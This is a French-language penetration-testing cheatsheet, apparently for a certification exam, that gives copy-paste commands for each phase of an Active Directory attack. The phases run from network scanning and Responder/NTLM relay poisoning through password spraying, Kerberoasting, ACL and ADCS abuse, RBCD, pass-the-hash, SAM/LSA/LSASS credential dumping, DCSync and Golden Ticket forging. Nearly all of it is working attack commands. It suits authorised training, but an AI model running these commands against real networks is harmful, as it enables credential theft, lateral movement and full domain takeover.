# Cheatsheet — Commandes par phase

> Copier-coller directement. Remplacer les variables par tes valeurs.

---

## Variables à définir en premier

```bash
export IFACE="eth0"
export RANGE="192.168.X.0/24"
export DC_IP="192.168.X.10"
export DC_FQDN="dc01.entreprise.local"
export DOMAIN="ENTREPRISE"
export DOMAIN_FQDN="entreprise.local"
export USER="alice"
export PWD="Password2024"
export HASH="aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF0011"
export NT_HASH="${HASH##*:}"
export DOMAIN_SID="S-1-5-21-XXX-YYY-ZZZ"
export ATTACKER_IP="192.168.X.99"
```

---

## Phase 0 — Setup

```bash
mkdir -p ~/certif/{scans,hashes,tickets,loot,logs,bloodhound}
echo "DC_IP=$DC_IP" > ~/certif/notes.txt
echo "$DC_IP  $DC_FQDN  $DOMAIN_FQDN" | sudo tee -a /etc/hosts
echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
```

---

## Phase 1 — Reconnaissance

```bash
# Découverte hôtes
nmap -sn $RANGE -oA ~/certif/scans/hosts_alive
nxc smb $RANGE 2>/dev/null | tee ~/certif/scans/smb_hosts.txt

# Trouver le DC (port 88)
nmap -p 88 --open $RANGE

# Scan complet DC
nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985 \
    $DC_IP -oA ~/certif/scans/dc_full

# Vulnérabilités SMB
nmap -Pn --script smb-vuln* -p 139,445 $RANGE | tee ~/certif/scans/vulns.txt

# Infos DNS
nslookup $DC_IP
dig axfr $DOMAIN_FQDN @$DC_IP

# DHCP info
sudo nmap --script broadcast-dhcp-discover -e $IFACE

# Responder passif
sudo responder -I $IFACE -A
```

---

## Phase 2 — Accès Initial

```bash
# Responder actif
sudo responder -I $IFACE -rdw
# Cracker les hashes
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/wordlists/rockyou.txt

# Préparer relay NTLM
nxc smb $RANGE --gen-relay-list ~/certif/targets_relay.txt
# SMB=Off / HTTP=Off dans Responder.conf, puis :
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks

# MITMv6
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE &
ntlmrelayx.py -6 -t ldaps://$DC_IP --delegate-access --add-computer

# Énumération users sans auth
nxc smb $DC_IP -u '' -p '' --rid-brute 5000 | grep SidTypeUser \
    | awk -F'\' '{print $NF}' | cut -d' ' -f1 > ~/certif/users.txt

# AS-REP Roasting sans auth
GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
    -usersfile ~/certif/users.txt -dc-ip $DC_IP \
    -outputfile ~/certif/hashes/asrep.hash
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt

# Password Spraying
nxc smb $DC_IP -u '' -p '' --pass-pol    # vérifier lockout d'abord !
nxc smb $DC_IP -u ~/certif/users.txt -p 'Password2024' --continue-on-success

# Kerbrute
kerbrute userenum --dc $DC_IP -d $DOMAIN_FQDN ~/certif/users.txt
kerbrute passwordspray --dc $DC_IP -d $DOMAIN_FQDN ~/certif/users.txt 'Password2024'

# Valider credentials
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN
```

---

## Phase 3 — Énumération

```bash
# BloodHound
bloodhound-python -u $USER -p $PWD -d $DOMAIN_FQDN \
    -dc $DC_FQDN -ns $DC_IP -c All --zip -o ~/certif/bloodhound/
sudo neo4j start && bloodhound &

# NetExec — cartographie
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --shares
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --users
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --groups
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --sessions
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --pass-pol

# LDAP dump
ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP -o ~/certif/loot/ldap/
grep -ri "description\|cpassword\|password" ~/certif/loot/ldap/

# SYSVOL
smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PWD \
    -c "recurse ON; mget *" 2>/dev/null
find ~/certif/loot/ -name "*.xml" -exec grep -l cpassword {} \;
gpp-decrypt 'CPASSWORD_VALUE'

# Spider
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN -M spider_plus

# ADCS
certipy find -u $USER@$DOMAIN_FQDN -p $PWD -dc-ip $DC_IP \
    -vulnerable -stdout | tee ~/certif/loot/adcs.txt

# LAPS + gMSA
nxc ldap $DC_IP -d $DOMAIN -u $USER -p $PWD --module laps
nxc ldap $DC_IP -u $USER -p $PWD --gmsa
```

---

## Phase 4 — Escalade

```bash
# Kerberoasting
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP \
    -request -outputfile ~/certif/hashes/kerberoast.hash
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --kerberoasting ~/certif/hashes/kerberoast.hash
hashcat -m 13100 ~/certif/hashes/kerberoast.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (avec credentials)
GetNPUsers.py $DOMAIN_FQDN/$USER:$PWD -request -format hashcat \
    -outputfile ~/certif/hashes/asrep.hash
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --asreproast ~/certif/hashes/asrep.hash
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt

# ACL Abuse — ForceChangePassword
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    set password $TARGET_USER 'NewPass123!'

# ACL Abuse — AddMember
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    add groupMember 'Domain Admins' $USER

# ADCS ESC1
certipy req -u $USER@$DOMAIN_FQDN -p $PWD \
    -target $CA_SERVER -template $VULN_TEMPLATE -ca $CA_NAME \
    -upn Administrator@$DOMAIN_FQDN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# RBCD
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
    -dc-ip $DC_IP $DOMAIN_FQDN/$USER:$PWD
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
    -dc-ip $DC_IP -action write $DOMAIN_FQDN/$USER:$PWD
getST.py -spn 'cifs/target.entreprise.local' \
    -impersonate Administrator $DOMAIN/EVIL\$:'EvilPass123!'
export KRB5CCNAME=$PWD/Administrator.ccache
```

---

## Phase 5 — Mouvement latéral

```bash
# Pass-the-Hash
nxc smb $RANGE -u $USER -H $NT_HASH -d $DOMAIN
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
evil-winrm -i $TARGET -u $USER -H $NT_HASH

# Dump sur chaque machine compromise
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --sam
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --lsa
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M lsassy
secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET

# Pass-the-Ticket
getTGT.py $DOMAIN_FQDN/$USER:$PWD
export KRB5CCNAME=$PWD/$USER.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$DC_FQDN
```

---

## Phase 6 — Compromission

```bash
# DCSync
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP -just-dc-ntlm \
    | tee ~/certif/loot/ntds_dump.txt
secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP -just-dc-ntlm
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --ntds

# Extraire hashes prioritaires
grep "Administrator:" ~/certif/loot/ntds_dump.txt
grep "krbtgt:" ~/certif/loot/ntds_dump.txt
grep "Domain SID" ~/certif/loot/ntds_dump.txt

# Connexion Administrator
psexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP
evil-winrm -i $DC_IP -u Administrator -H $ADMIN_HASH

# Golden Ticket
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID \
    -domain $DOMAIN_FQDN Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN

# SID du domaine
lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0 | head
```

---

## Divers

```bash
# Synchro horloge Kerberos
sudo ntpdate $DC_IP

# Convertir ticket
ticketConverter.py ticket.ccache ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

# GPP decrypt
gpp-decrypt 'CPASSWORD_VALUE'

# Délégations
findDelegation.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP
```
